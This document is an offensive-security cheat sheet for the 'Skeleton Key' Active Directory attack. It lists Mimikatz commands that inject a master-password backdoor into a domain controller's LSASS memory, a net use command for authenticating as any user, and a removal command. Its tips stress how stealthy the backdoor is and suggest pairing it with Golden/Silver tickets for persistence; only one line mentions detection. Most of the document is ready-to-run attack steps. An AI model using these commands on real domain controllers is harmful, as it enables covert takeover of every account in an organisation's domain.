# SkeletonKey

**Type:** Active Directory / Domain Controller Attack
**Focus:** Master password backdoor for AD authentication

---

## 1. Full Feature Overview

* Installs a memory-resident backdoor on a Domain Controller
* Allows attacker to authenticate as any AD user using a master password
* Does **not** modify stored passwords, making detection harder
* Compatible with Windows Server 2008+
* Often combined with lateral movement and persistence tools (Mimikatz, PowerView)
* Requires admin privileges on the DC

---

## 2. Requirements & Setup

### Requirements

* Windows Server DC
* Domain Admin privileges (or SYSTEM on DC)
* Mimikatz (or custom scripts) to deploy

### Installation

* No persistent files; injected into LSASS process memory
* Use Mimikatz: `misc::skeleton` module

---

## 3. Core Usage

### 3.1 Deploy Skeleton Key

```text
# Launch Mimikatz
privilege::debug

# Install Skeleton Key with master password 'MasterPass123'
misc::skeleton /install /password:MasterPass123
```

### 3.2 Authenticate with Backdoor

```text
# Login as any user using the master password
net use \\DC\C$ /user:SomeUser MasterPass123
```

### 3.3 Remove Skeleton Key

```text
# Uninstall backdoor
misc::skeleton /remove
```

---

## 4. Tips, Tricks, Best Practices

* Extremely stealthy; leaves no password hashes
* Works even if user changes their original password
* Combine with Golden/Silver tickets for persistence
* Monitor unusual LSASS memory activity for detection
* Always uninstall in lab environments to avoid DC compromise

---

## 5. Cheat Sheet

```text
# Install Skeleton Key
privilege::debug
misc::skeleton /install /password:MasterPass123

# Authenticate as any user
net use \\DC\C$ /user:SomeUser MasterPass123

# Remove Skeleton Key
misc::skeleton /remove
```

---
